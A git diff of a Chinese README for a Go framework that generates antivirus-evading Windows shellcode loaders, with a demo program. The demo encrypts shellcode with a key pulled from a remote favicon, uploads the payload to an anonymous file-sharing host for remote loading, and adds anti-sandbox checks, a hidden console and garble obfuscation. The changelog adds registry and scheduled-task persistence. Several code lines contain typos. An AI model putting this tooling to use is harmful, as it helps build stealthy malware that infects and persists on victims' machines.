@@ -14,6 +14,11 @@ Go Anti-Virus Framework
 
 ### 更新日志
 
+### 2024.3.21
+
+1. 新增`alive`自动维权模块，现支持注册表启动项，计划任务`COM API`
+2. 文档更新
+
 ### 2024.3.19
 
 1. 更新自删除，将`hook.SelfDelete()`置于`loader,inject`方法之前即可
@@ -125,12 +130,14 @@ Go Anti-Virus Framework
 
 ## Tmpl Struct
 
+动态模板支持
+
 ```go
 type Data struct {
 	CipherText    string      // 保存加密文本的变量名
 	PlainText     string      // 保存解密文本的变量名
-	Payload       string      // 加密 shellcode
 	DecryptMethod string      // 解密方法
+	Pokemon       interface{} // Pokemon Shellcode
 	Loader        interface{} // loader
 	SandBox       interface{} // 反沙箱模块
 	Local         interface{} // 本地加载模块
@@ -152,6 +159,19 @@ type Data struct {
 // 手动编译，设置临时环境变量
 set GOPRIVATE=* 
 set GOGARBLE=* 
+```
+
+### 编译器支持
+
+```go
+// 基础参数：ldflags="-s -w -H=windowsgui" -trampath
+func (c CompileOpts) GoCompile() error {
+	return c.compile("go")
+}
+
+func (c CompileOpts) GarbleCompile() error {
+	return c.compile("garble")
+}
 ```
 
 ## Remote ShellCode Exec
@@ -185,7 +205,7 @@ set GOGARBLE=*
 	// 设置远程加载渲染模板
 	remoteSet := render.Remote{
 		Import:  "variant/remote",
-		Url:     cUrl.CurlUpload(),
+		Url:     cUrl. TransferUpload(),
 		Method:  "remote.RestyStrings",
 	}
 ```
@@ -231,6 +251,8 @@ set GOGARBLE=*
 
 ## Demo
 
+动态加载数据
+
 ```go
 package main
 
@@ -239,84 +261,84 @@ import (
 	"strings"
 	"variant/build"
 	"variant/crypto"
+	"variant/dynamic"
 	"variant/enc"
 	"variant/log"
+	"variant/network"
 	"variant/rand"
 	"variant/render"
 )
 
 func main() {
-    // 反沙箱模块
+	// 反沙箱模块
 	sandbox := render.SandBox{
 		Methods: []string{
-			"sandbox.BootTime()",
-			"sandbox.GetDesktopFiles()",
+			"sandbox.BootTime",
+			"sandbox.GetDesktopFiles",
 		}}
-    
-    // 动态数据
-    dy := render.Dynamic{
-		Import:        "variant/dynamic",
-		DynamicUrl:    "https://www.baidu.com/favicon.ico",
-		DynamicMethod: "dynamic.GetIcoHex",
-		DynamicKey:    rand.RStrings(),
-		KeyStart:      0,
-		KeyEnd:        8,
-		DynamicIV:     rand.RStrings(),
-		IVStart:       10,
-		IVEnd:         18,
-	}
-	
-    // 本地加载
-	local := render.Local{
-		KeyName:  rand.RStrings(),
-		KeyValue: rand.LStrings(16),
-		IvName:   rand.RStrings(),
-		IvValue:  rand.LStrings(16),
+
+	dy := render.Dynamic{
+		Import:        "variant/dynamic", 	// 导入库
+		DynamicUrl:    dynamic.CtIcoUrl,    // 动态 key
+		DynamicMethod: "dynamic.GetIcoHex", // 动态获取 key
+		DynamicKey:    rand.RStrings(), 	// 随机变量名
+		KeyStart:      0, 					// 动态获取 key 起始区间
+		KeyEnd:        8, 					// 动态获取 key 结束区间
+		DynamicIV:     rand.RStrings(), 	// 随机变量名
+		IVStart:       10,					// 动态获取 IV 起始区间
+		IVEnd:         18,					// 动态获取 IV 起始区间
 	}
 
-	// 定义模板渲染数据
-	data := render.Data{
-		CipherText: rand.RStrings(),
-		PlainText:  rand.RStrings(),
-		Decrypt:    "XorSm4HexBase85Decrypt",
-		Loader:     "UuidFromString",
-		Local:      local,
-        Dynamic：   dy,
-        SandBox:    sandbox,
-	}
-    
-	// 定义模板渲染数据
-	data := render.Data{
-		CipherText: rand.RStrings(),
-		PlainText:  rand.RStrings(),
-		Decrypt:    "XorSm4HexBase85Decrypt",
-		Loader:     "HalosGate",
+	loader := render.Loader{
+		Method: "loader.UuidFromStringLoad", // 加载器
+		Hide:   "loader.HideConsoleW32",	 // 隐藏执行窗口 
 	}
 
 	// 设置加密参数
 	params := enc.Payload{
-		PlainText: "render/templates/payload.bin",
-		//Key: []byte(local.KeyValue),
-		Key: dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd),
-		//IV:  []byte(local.IvValue),
-		IV:  dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),
+		PlainText: "render/templates/payload.bin", // raw shellcode
+		FileName:  rand.RStrings(),  			   // 随机变量名
+		Path:      "output",					   // 加密后的 shellcode 输出文件夹
+		Key:       dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd), // 动态 key 加密 shellcode
+		IV:        dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),   // 动态 IV 加密 shellcode
 	}
 	// 加密之后的 shellcode
-	tmp, err := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
-	if err != nil {
-		log.Fatal(err)
+	payload, _ := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
+	_ = params.WriteStrings(payload)
+
+	// 上传远程加载的Payload到第三方
+	fi := network.FileIO{
+		Path: "output",			// 加密后的 shellcode 输出文件夹
+		Src:  params.FileName,  // 加密后的 shellcode 文件名称
 	}
-	data.Payload = tmp
+
+	// 设置远程加载渲染模板
+	remoteSet := render.Remote{
+		Import: "variant/network",    // 导入库
+		Method: "network.FileIORead", // 动态读取 shellcode 方法
+		Url:    fi.FileIOUpload(),    // 上传 shellcode 到匿名临时空间
+	}
+
+	// 定义模板渲染数据
+	data := render.Data{
+		CipherText:    rand.RStrings(), // 随机变量名
+		PlainText:     rand.RStrings(), // 随机变量名
+		DecryptMethod: "crypto.XorSm4HexBase85Decrypt", // 解密方法
+		Loader:        loader,     // 加载器
+		Dynamic:       dy,     	   // 动态数据配置
+		Remote:        remoteSet,  // 远程加载配置
+		SandBox:       sandbox,    // 反沙箱配置
+	}
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/base.tmpl",
-		OutputDir:    "output",
-		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
-		Data:         data,
+		TmplFile:     "render/templates/v4/Base.tmpl", // 指定模板文件
+		OutputDir:    "output",						   // 模板编译文件位置
+		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()), // 模板文件名称
+		Data:         data, // 加载器数据
 	}
 	// 生成模板
-	err = render.TmplRender(tOpts)
+	err := render.TmplRender(tOpts)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -327,9 +349,14 @@ func main() {
 		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
 		HideConsole: false,
 		CompilePath: "output",
+		GSeed:       true,
+		GDebug:      true,
+		Literals:    true,
+        Tiny：		true,
 	}
+
 	// 编译
-	if err = cOpts.Compile(); err != nil {
+	if err = cOpts.GoCompile(); err != nil {
 		log.Fatal(err)
 	}
 
